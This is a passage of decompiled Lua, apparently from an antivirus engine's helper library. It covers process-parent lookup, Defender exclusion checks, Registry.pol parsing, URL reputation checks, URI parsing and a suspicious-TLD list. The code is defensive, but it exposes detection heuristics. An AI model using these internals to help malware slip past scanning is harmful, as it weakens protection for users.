    L3_2 = {}
    L4_2 = {}
    L3_2.filelist = L4_2
    L4_2 = {}
    L3_2.alldata = L4_2
    L3_2.score = 0
    A1_2 = L3_2
  end
  L3_2 = type
  L4_2 = A1_2.filelist
  L3_2 = L3_2(L4_2)
  if L3_2 ~= "table" then
    L3_2 = {}
    A1_2.filelist = L3_2
  end
  L3_2 = type
  L4_2 = A1_2.alldata
  L3_2 = L3_2(L4_2)
  if L3_2 ~= "table" then
    L3_2 = {}
    A1_2.alldata = L3_2
  end
  L3_2 = type
  L4_2 = A1_2.score
  L3_2 = L3_2(L4_2)
  if L3_2 ~= "number" then
    A1_2.score = 0
  end
  L3_2 = safeJsonDeserialize
  L4_2 = L2_2
  L3_2 = L3_2(L4_2)
  if not L3_2 then
    L4_2 = false
    return L4_2
  end
  L4_2 = table
  L4_2 = L4_2.insert
  L5_2 = A1_2.filelist
  L6_2 = L3_2.FileName
  L4_2(L5_2, L6_2)
  L4_2 = A1_2.score
  L5_2 = L3_2.score
  L4_2 = L4_2 + L5_2
  A1_2.score = L4_2
  L4_2 = table
  L4_2 = L4_2.insert
  L5_2 = A1_2.alldata
  L6_2 = L2_2
  L4_2(L5_2, L6_2)
  L4_2 = L3_2.parent
  if L4_2 ~= nil then
    L4_2 = GetTrackingDataForFile
    L5_2 = L3_2.parent
    L6_2 = A1_2
    L4_2 = L4_2(L5_2, L6_2)
    if not L4_2 then
      L4_2 = false
      return L4_2
    end
  end
  L4_2 = true
  return L4_2
end

GetTrackingDataForFile = L23_1

function L23_1()
  local L0_2, L1_2, L2_2, L3_2, L4_2
  L2_2 = bm
  if not L2_2 then
    L2_2 = mp
    L2_2 = L2_2.GetScannedPPID
    if L2_2 then
      L2_2 = pcall
      L3_2 = mp
      L3_2 = L3_2.GetScannedPPID
      L2_2, L3_2 = L2_2(L3_2)
      L0_2 = L3_2
      _ = L2_2
      L1_2 = "HSTR"
    end
  end
  if not L0_2 then
    L2_2 = bm
    if L2_2 then
      L2_2 = bm
      L2_2 = L2_2.get_current_process_startup_info
      if L2_2 then
        L2_2 = pcall
        L3_2 = bm
        L3_2 = L3_2.get_current_process_startup_info
        L2_2, L3_2 = L2_2(L3_2)
        if L3_2 then
          L4_2 = L3_2.ppid
          if L4_2 then
            L0_2 = L3_2.ppid
            L1_2 = "BM"
          end
        end
      end
    end
  end
  if not L0_2 then
    L2_2 = mp
    L2_2 = L2_2.CONTEXT_DATA_PROCESS_PPID
    if L2_2 then
      L2_2 = pcall
      L3_2 = mp
      L3_2 = L3_2.get_contextdata
      L4_2 = mp
      L4_2 = L4_2.CONTEXT_DATA_PROCESS_PPID
      L2_2, L3_2 = L2_2(L3_2, L4_2)
      L0_2 = L3_2
      _ = L2_2
      L1_2 = "LUA"
    end
  end
  if not L0_2 then
    L2_2 = mp
    L2_2 = L2_2.CONTEXT_DATA_AMSI_OPERATION_PPID
    if L2_2 then
      L2_2 = pcall
      L3_2 = mp
      L3_2 = L3_2.get_contextdata
      L4_2 = mp
      L4_2 = L4_2.CONTEXT_DATA_AMSI_OPERATION_PPID
      L2_2, L3_2 = L2_2(L3_2, L4_2)
      L0_2 = L3_2
      _ = L2_2
      L1_2 = "AMSI"
    end
  end
  L2_2 = L0_2
  L3_2 = L1_2
  return L2_2, L3_2
end

GetCurrentPPID = L23_1

function L23_1(A0_2, A1_2, A2_2)
  local L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2
  L3_2 = type
  L4_2 = A0_2
  L3_2 = L3_2(L4_2)
  if L3_2 ~= "string" then
    L3_2 = false
    return L3_2
  end
  L3_2 = type
  L4_2 = A2_2
  L3_2 = L3_2(L4_2)
  if L3_2 == "nil" then
    A2_2 = true
  end
  if A2_2 ~= nil then
    L3_2 = type
    L4_2 = A2_2
    L3_2 = L3_2(L4_2)
    if L3_2 ~= "boolean" then
      L3_2 = false
      return L3_2
    end
  end
  L3_2 = type
  L4_2 = A1_2
  L3_2 = L3_2(L4_2)
  if L3_2 ~= "table" then
    L3_2 = type
    L4_2 = A1_2
    L3_2 = L3_2(L4_2)
    if L3_2 ~= "string" then
      L3_2 = false
      return L3_2
    end
  end
  L3_2 = type
  L4_2 = A1_2
  L3_2 = L3_2(L4_2)
  if L3_2 == "string" then
    L3_2 = {}
    L4_2 = A1_2
    L3_2[1] = L4_2
    A1_2 = L3_2
  end
  L3_2 = pairs
  L4_2 = A1_2
  L3_2, L4_2, L5_2 = L3_2(L4_2)
  for L6_2, L7_2 in L3_2, L4_2, L5_2 do
    if A2_2 then
      L9_2 = L7_2
      L8_2 = L7_2.lower
      L8_2 = L8_2(L9_2)
      L7_2 = L8_2
      L9_2 = A0_2
      L8_2 = A0_2.lower
      L8_2 = L8_2(L9_2)
      A0_2 = L8_2
    end
    L8_2 = string
    L8_2 = L8_2.find
    L9_2 = A0_2
    L10_2 = L7_2
    L11_2 = 1
    L12_2 = A2_2
    L8_2 = L8_2(L9_2, L10_2, L11_2, L12_2)
    if L8_2 then
      L8_2 = true
      return L8_2
    end
  end
  L3_2 = false
  return L3_2
end

Contains_any_caseinsenstive = L23_1

function L23_1(A0_2, A1_2, A2_2)
  local L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2
  L3_2 = "PERSISTCONTEXT"
  L4_2 = GetRollingQueueCount
  L5_2 = L3_2
  L4_2 = L4_2(L5_2)
  if 5000 <= L4_2 then
    L4_2 = false
    return L4_2
  end
  if not A2_2 then
    A2_2 = 3600
  end
  L4_2 = 5000
  L5_2 = pcall
  L6_2 = AppendToRollingQueue
  L7_2 = "PERSISTCONTEXT"
  L8_2 = A0_2
  L9_2 = A1_2
  L10_2 = A2_2
  L11_2 = L4_2
  L12_2 = 1
  L5_2 = L5_2(L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2)
  if not L5_2 then
    L6_2 = false
    return L6_2
  end
  L6_2 = true
  return L6_2
end

SetPersistContextNoPath = L23_1

function L23_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2, L6_2
  L2_2 = "PERSISTCONTEXT"
  L3_2 = pcall
  L4_2 = GetRollingQueueKeyValue
  L5_2 = "PERSISTCONTEXT"
  L6_2 = A0_2
  L3_2, L4_2 = L3_2(L4_2, L5_2, L6_2)
  if L3_2 and L4_2 then
    L5_2 = A1_2 == L4_2
    return L5_2
  else
    L5_2 = false
    return L5_2
  end
end

QueryPersistContextNoPath = L23_1

function L23_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2, L5_2
  L1_2 = "PERSISTCONTEXT"
  L2_2 = pcall
  L3_2 = MpCommon
  L3_2 = L3_2.RollingQueueQueryKeyRegex
  L4_2 = "PERSISTCONTEXT"
  L5_2 = A0_2
  L2_2, L3_2 = L2_2(L3_2, L4_2, L5_2)
  if L2_2 and L3_2 then
    return L3_2
  end
  L4_2 = nil
  return L4_2
end

GetPersistContextValueForKeyRegex = L23_1

function L23_1()
  local L0_2, L1_2, L2_2, L3_2, L4_2
  L0_2 = GetCurrentPPID
  L0_2 = L0_2()
  if not L0_2 then
    L1_2 = false
    return L1_2
  end
  L1_2 = pcall
  L2_2 = MpCommon
  L2_2 = L2_2.QuerySessionInformation
  L3_2 = L0_2
  L4_2 = MpCommon
  L4_2 = L4_2.WTSIsRemoteSession
  L1_2, L2_2 = L1_2(L2_2, L3_2, L4_2)
  if L1_2 and L2_2 then
    L3_2 = true
    return L3_2
  end
  L3_2 = false
  return L3_2
end

IsRemoteSession = L23_1

function L23_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2
  L1_2 = string
  L1_2 = L1_2.match
  L2_2 = A0_2
  L3_2 = "%.([^%.\\]+)$"
  L1_2 = L1_2(L2_2, L3_2)
  L2_2 = "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\"
  if L1_2 then
    L3_2 = L2_2
    L4_2 = "Extensions"
    L3_2 = L3_2 .. L4_2
    L4_2 = sysio
    L4_2 = L4_2.RegOpenKey
    L5_2 = L3_2
    L4_2 = L4_2(L5_2)
    if L4_2 then
      L5_2 = sysio
      L5_2 = L5_2.RegEnumValues
      L6_2 = L4_2
      L5_2 = L5_2(L6_2)
      L6_2 = pairs
      L7_2 = L5_2
      L6_2, L7_2, L8_2 = L6_2(L7_2)
      for L9_2, L10_2 in L6_2, L7_2, L8_2 do
        L11_2 = string
        L11_2 = L11_2.find
        L12_2 = L10_2
        L13_2 = L1_2
        L14_2 = 1
        L15_2 = true
        L11_2 = L11_2(L12_2, L13_2, L14_2, L15_2)
        if L11_2 then
          L11_2 = true
          L12_2 = L1_2
          return L11_2, L12_2
        end
      end
    end
  end
  L3_2 = L2_2
  L4_2 = "Paths"
  L3_2 = L3_2 .. L4_2
  L4_2 = sysio
  L4_2 = L4_2.RegOpenKey
  L5_2 = L3_2
  L4_2 = L4_2(L5_2)
  L5_2 = string
  L5_2 = L5_2.lower
  L6_2 = A0_2
  L5_2 = L5_2(L6_2)
  A0_2 = L5_2
  if L4_2 then
    L5_2 = sysio
    L5_2 = L5_2.RegEnumValues
    L6_2 = L4_2
    L5_2 = L5_2(L6_2)
    L6_2 = pairs
    L7_2 = L5_2
    L6_2, L7_2, L8_2 = L6_2(L7_2)
    for L9_2, L10_2 in L6_2, L7_2, L8_2 do
      L11_2 = MpCommon
      L11_2 = L11_2.ExpandEnvironmentVariables
      L12_2 = L10_2
      L11_2 = L11_2(L12_2)
      L10_2 = L11_2
      L12_2 = L10_2
      L11_2 = L10_2.lower
      L11_2 = L11_2(L12_2)
      L12_2 = L11_2
      L11_2 = L11_2.gsub
      L13_2 = "%."
      L14_2 = "%%."
      L11_2 = L11_2(L12_2, L13_2, L14_2)
      L12_2 = L11_2
      L11_2 = L11_2.gsub
      L13_2 = "?"
      L14_2 = "."
      L11_2 = L11_2(L12_2, L13_2, L14_2)
      L12_2 = L11_2
      L11_2 = L11_2.gsub
      L13_2 = "*"
      L14_2 = "[^\\]+"
      L11_2 = L11_2(L12_2, L13_2, L14_2)
      L10_2 = L11_2
      L12_2 = A0_2
      L11_2 = A0_2.find
      L13_2 = L10_2
      L11_2 = L11_2(L12_2, L13_2)
      if L11_2 then
        L11_2 = true
        L12_2 = L10_2
        return L11_2, L12_2
      end
    end
  end
  L5_2 = false
  return L5_2
end

IsAVExcluded = L23_1

function L23_1()
  local L0_2, L1_2, L2_2, L3_2
  L0_2 = sysio
  L0_2 = L0_2.RegOpenKey
  L1_2 = "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Spynet"
  L0_2 = L0_2(L1_2)
  if L0_2 then
    L1_2 = sysio
    L1_2 = L1_2.GetRegValueAsDword
    L2_2 = L0_2
    L3_2 = "IsCloudTestMachine"
    L1_2 = L1_2(L2_2, L3_2)
    if L1_2 and L1_2 == 1 then
      L2_2 = true
      return L2_2
    end
  end
  L1_2 = false
  return L1_2
end

IsCloudTestMachine = L23_1

function L23_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2
  L1_2 = {}
  L2_2 = sysio
  L2_2 = L2_2.GetFileSize
  L3_2 = A0_2
  L2_2 = L2_2(L3_2)
  L3_2 = sysio
  L3_2 = L3_2.GetLastResult
  L3_2 = L3_2()
  L3_2 = L3_2.Success
  if not L3_2 then
    return L1_2
  end
  if L2_2 < 8 or 131072 < L2_2 then
    return L1_2
  end
  L3_2 = sysio
  L3_2 = L3_2.ReadFile
  L4_2 = A0_2
  L5_2 = 0
  L6_2 = 8
  L3_2 = L3_2(L4_2, L5_2, L6_2)
  if not L3_2 then
    return L1_2
  end
  L4_2 = mp
  L4_2 = L4_2.readu_u32
  L5_2 = L3_2
  L6_2 = 1
  L4_2 = L4_2(L5_2, L6_2)
  if L4_2 ~= 1734693456 then
    return L1_2
  end
  L5_2 = mp
  L5_2 = L5_2.readu_u32
  L6_2 = L3_2
  L7_2 = 5
  L5_2 = L5_2(L6_2, L7_2)
  if L5_2 ~= 1 then
    return L1_2
  end
  
  function L6_2(A0_3, A1_3)
    local L2_3, L3_3, L4_3, L5_3, L6_3, L7_3, L8_3, L9_3, L10_3, L11_3, L12_3
    L2_3 = A1_3
    L3_3 = mp
    L3_3 = L3_3.readu_u16
    L4_3 = A0_3
    L5_3 = L2_3
    L3_3 = L3_3(L4_3, L5_3)
    if 91 ~= L3_3 then
      L3_3 = 0
      return L3_3
    end
    L2_3 = L2_3 + 2
    L4_3 = A0_3
    L3_3 = A0_3.find
    L5_3 = "%z%z"
    L6_3 = L2_3
    L3_3 = L3_3(L4_3, L5_3, L6_3)
    L4_3 = L3_3 % 2
    if L4_3 == 1 then
      L4_3 = L3_3 + 1
      L3_3 = L4_3 or L3_3
      if not L4_3 then
      end
    end
    L3_3 = L3_3 + 2
    L4_3 = mp
    L4_3 = L4_3.utf16to8
    L6_3 = A0_3
    L5_3 = A0_3.sub
    L7_3 = L2_3
    L8_3 = L3_3
    L5_3, L6_3, L7_3, L8_3, L9_3, L10_3, L11_3, L12_3 = L5_3(L6_3, L7_3, L8_3)
    L4_3 = L4_3(L5_3, L6_3, L7_3, L8_3, L9_3, L10_3, L11_3, L12_3)
    L2_3 = L3_3
    L5_3 = mp
    L5_3 = L5_3.readu_u16
    L6_3 = A0_3
    L7_3 = L2_3
    L5_3 = L5_3(L6_3, L7_3)
    if 59 ~= L5_3 then
      L5_3 = 0
      return L5_3
    end
    L2_3 = L2_3 + 2
    L6_3 = A0_3
    L5_3 = A0_3.find
    L7_3 = "%z%z"
    L8_3 = L2_3
    L5_3 = L5_3(L6_3, L7_3, L8_3)
    L6_3 = L5_3 % 2
    if L6_3 == 1 then
      L6_3 = L5_3 + 1
      L5_3 = L6_3 or L5_3
      if not L6_3 then
      end
    end
    L5_3 = L5_3 + 2
    L6_3 = mp
    L6_3 = L6_3.utf16to8
    L8_3 = A0_3
    L7_3 = A0_3.sub
    L9_3 = L2_3
    L10_3 = L5_3
    L7_3, L8_3, L9_3, L10_3, L11_3, L12_3 = L7_3(L8_3, L9_3, L10_3)
    L6_3 = L6_3(L7_3, L8_3, L9_3, L10_3, L11_3, L12_3)
    L2_3 = L5_3
    if L6_3 == "\000" then
      L6_3 = ""
      L2_3 = L2_3 - 1
    end
    L7_3 = mp
    L7_3 = L7_3.readu_u16
    L8_3 = A0_3
    L9_3 = L2_3
    L7_3 = L7_3(L8_3, L9_3)
    if 59 ~= L7_3 then
      L7_3 = 0
      return L7_3
    end
    L2_3 = L2_3 + 2
    L7_3 = mp
    L7_3 = L7_3.readu_u32
    L8_3 = A0_3
    L9_3 = L2_3
    L7_3 = L7_3(L8_3, L9_3)
    L2_3 = L2_3 + 4
    L8_3 = mp
    L8_3 = L8_3.readu_u16
    L9_3 = A0_3
    L10_3 = L2_3
    L8_3 = L8_3(L9_3, L10_3)
    if 59 ~= L8_3 then
      L8_3 = 0
      return L8_3
    end
    L2_3 = L2_3 + 2
    L8_3 = mp
    L8_3 = L8_3.readu_u32
    L9_3 = A0_3
    L10_3 = L2_3
    L8_3 = L8_3(L9_3, L10_3)
    L2_3 = L2_3 + 4
    L9_3 = mp
    L9_3 = L9_3.readu_u16
    L10_3 = A0_3
    L11_3 = L2_3
    L9_3 = L9_3(L10_3, L11_3)
    if 59 ~= L9_3 then
      L9_3 = 0
      return L9_3
    end
    L2_3 = L2_3 + 2
    L10_3 = A0_3
    L9_3 = A0_3.sub
    L11_3 = L2_3
    L12_3 = L2_3 + L8_3
    L12_3 = L12_3 - 1
    L9_3 = L9_3(L10_3, L11_3, L12_3)
    L2_3 = L2_3 + L8_3
    L10_3 = mp
    L10_3 = L10_3.readu_u16
    L11_3 = A0_3
    L12_3 = L2_3
    L10_3 = L10_3(L11_3, L12_3)
    if 93 ~= L10_3 then
      L10_3 = 0
      return L10_3
    end
    L2_3 = L2_3 + 2
    L10_3 = L1_2
    L11_3 = L1_2
    L11_3 = #L11_3
    L11_3 = L11_3 + 1
    L12_3 = {}
    L12_3.key = L4_3
    L12_3.value = L6_3
    L12_3.typ = L7_3
    L12_3.data = L9_3
    L10_3[L11_3] = L12_3
    L10_3 = L2_3 - A1_3
    return L10_3
  end
  
  L7_2 = sysio
  L7_2 = L7_2.ReadFile
  L8_2 = A0_2
  L9_2 = 0
  L10_2 = L2_2
  L7_2 = L7_2(L8_2, L9_2, L10_2)
  L3_2 = L7_2
  if not L3_2 then
    return L1_2
  end
  L7_2 = 9
  while L2_2 > L7_2 do
    L8_2 = L6_2
    L9_2 = L3_2
    L10_2 = L7_2
    L8_2 = L8_2(L9_2, L10_2)
    if L8_2 == 0 then
      L9_2 = string
      L9_2 = L9_2.format
      L10_2 = "parse error at offset %d in file size %d"
      L11_2 = L7_2
      L12_2 = L2_2
      L9_2 = L9_2(L10_2, L11_2, L12_2)
      L1_2.error = L9_2
      return L1_2
    end
    L7_2 = L7_2 + L8_2
  end
  return L1_2
end

parseRegistryPol = L23_1

function L23_1(A0_2, A1_2, A2_2, A3_2, A4_2)
  local L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2, L17_2
  if A0_2 == nil then
    L5_2 = nil
    return L5_2
  end
  if A1_2 == nil then
    L5_2 = nil
    return L5_2
  end
  if not A2_2 then
    A2_2 = 70
  end
  if not A3_2 then
    A3_2 = false
  end
  if not A4_2 then
    A4_2 = 2000
  end
  L5_2 = {}
  L6_2 = table_dedup
  L7_2 = A0_2
  L6_2 = L6_2(L7_2)
  A0_2 = L6_2
  L6_2 = ipairs
  L7_2 = A0_2
  L6_2, L7_2, L8_2 = L6_2(L7_2)
  for L9_2, L10_2 in L6_2, L7_2, L8_2 do
    if A3_2 then
      L11_2 = string
      L11_2 = L11_2.gsub
      L12_2 = L10_2
      L13_2 = "[#?].*$"
      L14_2 = ""
      L15_2 = 1
      L11_2 = L11_2(L12_2, L13_2, L14_2, L15_2)
      L10_2 = L11_2
    end
    L11_2 = mp
    L11_2 = L11_2.CheckUrl
    L12_2 = L10_2
    L13_2 = 0
    L11_2, L12_2 = L11_2(L12_2, L13_2)
    if L11_2 == 0 or L12_2 == 1 then
      L13_2 = mp
      L13_2 = L13_2.CheckUrl
      L14_2 = L10_2
      L15_2 = 2
      L13_2, L14_2 = L13_2(L14_2, L15_2)
      if L13_2 == 1 and L11_2 == 0 or L12_2 == 1 and L13_2 == 1 and L14_2 == 0 then
        L15_2 = true
        return L15_2
      elseif L13_2 == 0 and L11_2 == 0 then
        L15_2 = table
        L15_2 = L15_2.insert
        L16_2 = L5_2
        L17_2 = L10_2
        L15_2(L16_2, L17_2)
      end
    end
  end
  L6_2 = #L5_2
  if 0 < L6_2 then
    L6_2 = SafeGetUrlReputation
    L7_2 = L5_2
    L8_2 = A1_2
    L9_2 = false
    L10_2 = A4_2
    L6_2 = L6_2(L7_2, L8_2, L9_2, L10_2)
    L7_2 = L6_2.error
    if L7_2 ~= nil then
      L7_2 = false
      return L7_2
    end
    L7_2 = pairs
    L8_2 = L6_2.urls
    L7_2, L8_2, L9_2 = L7_2(L8_2)
    for L10_2, L11_2 in L7_2, L8_2, L9_2 do
      L12_2 = L11_2.determination
      if L12_2 ~= 2 then
        L12_2 = L11_2.determination
        if L12_2 ~= 3 then
          goto lbl_104
        end
      end
      L12_2 = L11_2.confidence
      if A2_2 <= L12_2 then
        L12_2 = true
        return L12_2
      end
      ::lbl_104::
    end
  end
  L6_2 = false
  return L6_2
end

CheckUrlReputationSimple = L23_1

function L23_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2
  L1_2 = {}
  if not A0_2 or A0_2 == "" then
    return L1_2
  end
  L2_2 = StringStartsWith
  L3_2 = A0_2
  L4_2 = "\\\\"
  L2_2 = L2_2(L3_2, L4_2)
  if L2_2 then
    L3_2 = A0_2
    L2_2 = A0_2.match
    L4_2 = "^\\\\([^\\]+)\\([^\\].*)$"
    L2_2, L3_2 = L2_2(L3_2, L4_2)
    if L2_2 then
      L1_2.scheme = "smb"
      L1_2.host = L2_2
      L1_2.path = L3_2
      return L1_2
    end
  end
  L3_2 = A0_2
  L2_2 = A0_2.match
  L4_2 = "^([^:/?#]+)://(.+)$"
  L2_2, L3_2 = L2_2(L3_2, L4_2)
  if L2_2 and L3_2 then
    L1_2.scheme = L2_2
    L5_2 = L3_2
    L4_2 = L3_2.match
    L6_2 = "^([^/?#]+)"
    L4_2 = L4_2(L5_2, L6_2)
    if L4_2 then
      L6_2 = L4_2
      L5_2 = L4_2.match
      L7_2 = "^(.+):(%d+)$"
      L5_2, L6_2 = L5_2(L6_2, L7_2)
      if L5_2 and L6_2 then
        L1_2.host = L5_2
        L7_2 = tonumber
        L8_2 = L6_2
        L7_2 = L7_2(L8_2)
        L1_2.port = L7_2
      else
        L1_2.host = L4_2
      end
    else
      L1_2.host = ""
    end
    L6_2 = L3_2
    L5_2 = L3_2.match
    L7_2 = "^[^/?#]+/(.+)$"
    L5_2 = L5_2(L6_2, L7_2)
    if L5_2 then
      L1_2.path = L5_2
      L7_2 = L5_2
      L6_2 = L5_2.find
      L8_2 = "[?#]"
      L6_2, L7_2 = L6_2(L7_2, L8_2)
      if L6_2 then
        L8_2 = string
        L8_2 = L8_2.sub
        L9_2 = L5_2
        L10_2 = 1
        L11_2 = L6_2 - 1
        L8_2 = L8_2(L9_2, L10_2, L11_2)
        L1_2.path = L8_2
        L8_2 = string
        L8_2 = L8_2.sub
        L9_2 = L5_2
        L10_2 = L6_2 + 1
        L8_2 = L8_2(L9_2, L10_2)
        L10_2 = L8_2
        L9_2 = L8_2.find
        L11_2 = "#"
        L12_2 = L6_2
        L13_2 = true
        L9_2, L10_2 = L9_2(L10_2, L11_2, L12_2, L13_2)
        L7_2 = L10_2
        L6_2 = L9_2
        if L6_2 then
          L9_2 = string
          L9_2 = L9_2.sub
          L10_2 = L8_2
          L11_2 = 1
          L12_2 = L6_2 - 1
          L9_2 = L9_2(L10_2, L11_2, L12_2)
          L1_2.query = L9_2
          L9_2 = string
          L9_2 = L9_2.sub
          L10_2 = L8_2
          L11_2 = L6_2 + 1
          L9_2 = L9_2(L10_2, L11_2)
          L1_2.fragment = L9_2
        else
          L1_2.query = L8_2
        end
      end
    end
    return L1_2
  end
  L1_2.scheme = "hostname"
  L1_2.host = A0_2
  L5_2 = A0_2
  L4_2 = A0_2.find
  L6_2 = ":(%d+)/?"
  L4_2, L5_2, L6_2 = L4_2(L5_2, L6_2)
  if L4_2 and L6_2 then
    L7_2 = string
    L7_2 = L7_2.sub
    L8_2 = A0_2
    L9_2 = 1
    L10_2 = L4_2 - 1
    L7_2 = L7_2(L8_2, L9_2, L10_2)
    L1_2.host = L7_2
    L7_2 = tonumber
    L8_2 = L6_2
    L7_2 = L7_2(L8_2)
    L1_2.port = L7_2
  end
  return L1_2
end

ExtractPartsFromUri = L23_1

function L23_1(A0_2)
  local L1_2, L2_2, L3_2
  if A0_2 == nil or A0_2 == "" then
    L1_2 = false
    return L1_2
  end
  L2_2 = A0_2
  L1_2 = A0_2.lower
  L1_2 = L1_2(L2_2)
  A0_2 = L1_2
  L1_2 = StringStartsWith
  L2_2 = A0_2
  L3_2 = "."
  L1_2 = L1_2(L2_2, L3_2)
  if not L1_2 then
    L1_2 = "."
    L2_2 = A0_2
    A0_2 = L1_2 .. L2_2
  end
  L1_2 = {}
  L1_2[".accountant"] = true
  L1_2[".accountants"] = true
  L1_2[".adult"] = true
  L1_2[".am"] = true
  L1_2[".app"] = true
  L1_2[".asia"] = true
  L1_2[".autos"] = true
  L1_2[".bar"] = true
  L1_2[".beauty"] = true
  L1_2[".bet"] = true
  L1_2[".bid"] = true
  L1_2[".bio"] = true
  L1_2[".biz"] = true
  L1_2[".blog"] = true
  L1_2[".boats"] = true
  L1_2[".bond"] = true
  L1_2[".buzz"] = true
  L1_2[".cam"] = true
  L1_2[".casino"] = true
  L1_2[".casa"] = true
  L1_2[".cd"] = true
  L1_2[".cc"] = true
  L1_2[".co"] = true
  L1_2[".cf"] = true
  L1_2[".cfd"] = true
  L1_2[".charity"] = true
  L1_2[".click"] = true
  L1_2[".club"] = true
  L1_2[".country"] = true
  L1_2[".culture"] = true
  L1_2[".cyou"] = true
  L1_2[".cyo"] = true
  L1_2[".coupons"] = true
  L1_2[".dat"] = true
  L1_2[".date"] = true
  L1_2[".degree"] = true
  L1_2[".digital"] = true
  L1_2[".download"] = true
  L1_2[".employerdbz"] = true
  L1_2[".eps"] = true
  L1_2[".faith"] = true
  L1_2[".flv"] = true
  L1_2[".forest"] = true
  L1_2[".fun"] = true
  L1_2[".gdn"] = true
  L1_2[".gq"] = true
  L1_2[".gd"] = true
  L1_2[".guru"] = true
  L1_2[".hair"] = true
  L1_2[".help"] = true
  L1_2[".icu"] = true
  L1_2[".info"] = true
  L1_2[".ink"] = true
  L1_2[".jetzt"] = true
  L1_2[".ke"] = true
  L1_2[".kim"] = true
  L1_2[".lat"] = true
  L1_2[".life"] = true
  L1_2[".link"] = true
  L1_2[".loan"] = true
  L1_2[".live"] = true
  L1_2[".m4a"] = true
  L1_2[".makeup"] = true
  L1_2[".mdb"] = true
  L1_2[".me"] = true
  L1_2[".mp3"] = true
  L1_2[".mp4"] = true
  L1_2[".my"] = true
  L1_2[".ml"] = true
  L1_2[".monster"] = true
  L1_2[".mom"] = true
  L1_2[".ninja"] = true
  L1_2[".online"] = true
  L1_2[".party"] = true
  L1_2[".pics"] = true
  L1_2[".poker"] = true
  L1_2[".porn"] = true
  L1_2[".press"] = true
  L1_2[".pro"] = true
  L1_2[".pub"] = true
  L1_2[".pw"] = true
  L1_2[".racing"] = true
  L1_2[".ren"] = true
  L1_2[".reise"] = true
  L1_2[".rest"] = true
  L1_2[".review"] = true
  L1_2[".rip"] = true
  L1_2[".rocks"] = true
  L1_2[".rodeo"] = true
  L1_2[".run"] = true
  L1_2[".sbs"] = true
  L1_2[".science"] = true
  L1_2[".sexy"] = true
  L1_2[".shop"] = true
  L1_2[".site"] = true
  L1_2[".skin"] = true
  L1_2[".space"] = true
  L1_2[".store"] = true
  L1_2[".stream"] = true
  L1_2[".su"] = true
  L1_2[".study"] = true
  L1_2[".tech"] = true
  L1_2[".technology"] = true
  L1_2[".terrifyenyb"] = true
  L1_2[".today"] = true
  L1_2[".top"] = true
  L1_2[".trade"] = true
  L1_2[".tube"] = true
  L1_2[".uno"] = true
  L1_2[".vip"] = true
  L1_2[".wang"] = true
  L1_2[".webcam"] = true
  L1_2[".win"] = true
  L1_2[".work"] = true
  L1_2[".world"] = true
  L1_2[".ws"] = true
  L1_2[".wtf"] = true
  L1_2[".xn--2scrj9c"] = true
  L1_2[".xn--5tzm5g"] = true
  L1_2[".xn--6frz82g"] = true
  L1_2[".xn--czrs0t"] = true
  L1_2[".xn--fjq720a"] = true
  L1_2[".xn--s9brj9c"] = true
  L1_2[".xn--unup4y"] = true
  L1_2[".xn--vhquv"] = true
  L1_2[".xn--xhq521b"] = true
  L1_2[".xin"] = true
  L1_2[".xxx"] = true
  L1_2[".xyz"] = true
  L1_2[".xll"] = true
  L1_2[".yokohama"] = true
  L1_2[".zip"] = true
  L1_2[".zw"] = true
  L1_2[".pr"] = true
  L1_2[".abc"] = true
  L1_2[".cloud"] = true
  L1_2[".one"] = true
  L1_2[".odd"] = true
  L1_2[".lol"] = true
  L1_2[".pm"] = true
  L1_2[".yachts"] = true
  L1_2[".onion"] = true
  L1_2[".host"] = true
  L1_2[".limo"] = true
  L1_2[".crt"] = true
  L1_2[".ong"] = true
  L1_2[".homes"] = true
  L1_2[".quest"] = true
  L1_2[".moe"] = true
  L1_2[".website"] = true
  L1_2[".surf"] = true
  L1_2[".forum"] = true
  L1_2[".courses"] = true
  L1_2[".garden"] = true
  L1_2[".christmas"] = true
  L1_2[".fit"] = true
  L2_2 = L1_2[A0_2]
  return L2_2
end

isSuspTLD = L23_1

function L23_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2, L17_2, L18_2, L19_2, L20_2, L21_2, L22_2, L23_2
  L1_2 = ""
  
  function L2_2(A0_3, A1_3)
    local L2_3, L3_3, L4_3, L5_3, L6_3, L7_3, L8_3, L9_3, L10_3, L11_3
    L2_3 = {}
    L3_3 = pairs
    L4_3 = A1_3
    L3_3, L4_3, L5_3 = L3_3(L4_3)
    for L6_3, L7_3 in L3_3, L4_3, L5_3 do
      L8_3 = pcall
      L9_3 = MpCommon
      L9_3 = L9_3.QuerySessionInformation
      L10_3 = A0_3
      L11_3 = L7_3
      L8_3, L9_3 = L8_3(L9_3, L10_3, L11_3)
      if L8_3 and L9_3 then
        L2_3[L6_3] = L9_3
      end
    end
    L3_3 = next
    L4_3 = L2_3
    L3_3 = L3_3(L4_3)
    if L3_3 == nil then
      L3_3 = {}
      return L3_3
    end
    return L2_3
  end
  
  function L3_2(A0_3)
    local L1_3, L2_3, L3_3
    if A0_3 == nil or A0_3 == "" then
      L1_3 = ""
      return L1_3
    end
    L2_3 = A0_3
    L1_3 = A0_3.match
    L3_3 = "^%d+%.%d+%.%d+%.%d+$"
    L1_3 = L1_3(L2_3, L3_3)
    if L1_3 then
      L1_3 = "IPv4"
      return L1_3
    end
    L2_3 = A0_3
    L1_3 = A0_3.match
    L3_3 = "^[%x:]+$"
    L1_3 = L1_3(L2_3, L3_3)
    if L1_3 then
      L1_3 = "IPv6"
      return L1_3
    end
    L1_3 = ""
